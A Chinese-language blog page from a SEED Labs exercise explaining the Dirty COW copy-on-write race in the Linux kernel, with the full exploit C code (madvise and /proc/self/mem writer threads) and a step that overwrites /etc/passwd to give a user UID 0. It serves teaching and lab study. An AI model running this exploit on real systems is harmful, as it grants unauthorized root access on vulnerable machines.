@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Lab environment这个实验，我们需要一个古旧的 linux 发行版，或许自己安装内核也行。这里我选择的是 SeedLab 提供的 ubuntu12.04，具体环境如下：  然后下载 Labsetup.zip 文件即可。 代码分析这里我们主要用三个线程，我们先看主线程。首先，以只读方式读取文件，这是在权限之内的。之后调用 fstat 得到文件的一些信息，再通过 mmap 把文件映射到自己">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dirty-COW-Attack-Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/958ee7cd.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Lab environment这个实验，我们需要一个古旧的 linux 发行版，或许自己安装内核也行。这里我选择的是 SeedLab 提供的 ubuntu12.04，具体环境如下：  然后下载 Labsetup.zip 文件即可。 代码分析这里我们主要用三个线程，我们先看主线程。首先，以只读方式读取文件，这是在权限之内的。之后调用 fstat 得到文件的一些信息，再通过 mmap 把文件映射到自己">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122900447.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114121345868.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122628537.png">
+<meta property="article:published_time" content="2022-11-14T06:11:35.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.275Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="Dirty-COW">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122900447.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Dirty-COW-Attack-Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/a7d9c628.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/eec1680.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/958ee7cd.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/958ee7cd.html&text=Dirty-COW-Attack-Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/958ee7cd.html&is_video=false&description=Dirty-COW-Attack-Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Dirty-COW-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/958ee7cd.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/958ee7cd.html&name=Dirty-COW-Attack-Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/958ee7cd.html&t=Dirty-COW-Attack-Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-environment"><span class="toc-number">1.</span> <span class="toc-text">Lab environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Modify-a-Dummy-Read-Only-File"><span class="toc-number">3.</span> <span class="toc-text">Task 1: Modify a Dummy Read-Only File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Modify the Password File to Gain the Root Privilege</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Dirty-COW-Attack-Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-14T06:11:35.000Z" class="dt-published" itemprop="datePublished">2022-11-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Dirty-COW/" rel="tag">Dirty-COW</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Lab-environment"><a href="#Lab-environment" class="headerlink" title="Lab environment"></a>Lab environment</h2><p>这个实验，我们需要一个古旧的 <code>linux</code> 发行版，或许自己安装内核也行。这里我选择的是 <code>SeedLab</code> 提供的 <code>ubuntu12.04</code>，具体环境如下：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122900447.png" alt="image-20221114122900447"></p>
+<p>然后下载 <code>Labsetup.zip</code> 文件即可。</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>这里我们主要用三个线程，我们先看主线程。首先，以只读方式读取文件，这是在权限之内的。之后调用 <code>fstat</code> 得到文件的一些信息，再通过 <code>mmap</code> 把文件映射到自己的内存空间。</p>
+<p>这种映射的作用就是，可以通过对内存的读写来实现对文件的读写，也就是说这一片内存空间，其实就是对于这个文件。进程间使用文件来通信使用的就是这种方式，一个文件映射到一块物理内存上，多个进程都有虚拟内存来对应这一块物理内存。这样每个进程对自己虚拟内存的修改会体现在物理内存上，其他进程就能够拿到这个修改的数据。</p>
+<p>我们看这里第三个参数指定是 <code>PROT_READ</code>，表示进程对这个映射只读。</p>
+<p>对于第四个参数，如果是 <code>MAP_SHAREED</code>，表示这个一个共享映射，进程之间共用物理空间；如果是 <code>MAP_PRIVATE</code>，就是将文件映射到调用进程的私有内存空间里，对底层文件和其他进程不可见。为了创建私有内存，需要将原始内存拷贝一份，而这个拷贝过程一般都是写时拷贝。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> pth1, pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Find the position of the target area</span></span><br><span class="line">    <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;222222&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span> *)file_size);</span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们看第一个子线程，这个线程的作用就是告诉内核，不需要这个私有拷贝了，退回到共享内存。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> file_size = (<span class="type">int</span>)arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个子线程，这个线程就是修改自己的这份私有拷贝。（因为是私有内存，所以可以写入），这个 <code>write</code> 因为写时拷贝的存在，会先对内存做一份拷贝，然后更新页表，让虚拟内存指向指向新创建的物理内存，然后再调用 <code>write</code> 写入内存。如果在执行完了第一第二步之后，调用了 <code>madvise</code> 宣布放弃这个内存，再来 <code>write</code> 就出错了，写到了最初的映射内存里面。（调用 <code>write</code> 已经检查过权限了，发现是写时拷贝，于是就开始了，这就导致第三步时不会再执行</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *content = <span class="string">&quot;******&quot;</span>;</span><br><span class="line">    <span class="type">off_t</span> offset = (<span class="type">off_t</span>)arg;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">        lseek(f, offset, SEEK_SET);</span><br><span class="line">        <span class="comment">// Write to the memory.</span></span><br><span class="line">        write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-1-Modify-a-Dummy-Read-Only-File"><a href="#Task-1-Modify-a-Dummy-Read-Only-File" class="headerlink" title="Task 1: Modify a Dummy Read-Only File"></a>Task 1: Modify a Dummy Read-Only File</h2><p>我们新建一个普通用户只读的文件，只有 <code>root</code> 用户可以写，在执行我们的攻击程序之后，可以看到，我们成功的修改了这个文件。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114121345868.png" alt="image-20221114121345868"></p>
+<h2 id="Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><a href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege" class="headerlink" title="Task 2: Modify the Password File to Gain the Root Privilege"></a>Task 2: Modify the Password File to Gain the Root Privilege</h2><p>首先，使用 <code>sudo adduser ceyewan</code> 创建一个新用户，然后查看 <code>/etc/passwd</code> 文件，可以看到并不是 root 用户，然后修改我们的攻击代码，将打开的文件替换为密码文件，<code>int f=open(&quot;/etc/passwd&quot;, O_RDONLY);</code>；然后查找 <code>ceyewan</code> 的位置，<code>char *position = strstr(map, &quot;ceyewan&quot;);</code>；最后，写入数据，把第三和第四个值修改为 0，但是为了保证长度不变，我们修改为 0000，<code> char *content= &quot;ceyewan:x:0000:0000:,,,:/home/ceyewan:/bin/bash&quot;;</code>。其他部分不变，重新编译执行，几秒钟后，查看 <code>passwd</code> 文件，发现变成了 <code>root</code> 用户，登录后，确实得到 root 权限，提权成功。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114122628537.png" alt="image-20221114122628537"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-environment"><span class="toc-number">1.</span> <span class="toc-text">Lab environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Modify-a-Dummy-Read-Only-File"><span class="toc-number">3.</span> <span class="toc-text">Task 1: Modify a Dummy Read-Only File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Modify the Password File to Gain the Root Privilege</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/958ee7cd.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/958ee7cd.html&text=Dirty-COW-Attack-Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/958ee7cd.html&is_video=false&description=Dirty-COW-Attack-Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Dirty-COW-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/958ee7cd.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/958ee7cd.html&title=Dirty-COW-Attack-Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/958ee7cd.html&name=Dirty-COW-Attack-Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/958ee7cd.html&t=Dirty-COW-Attack-Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
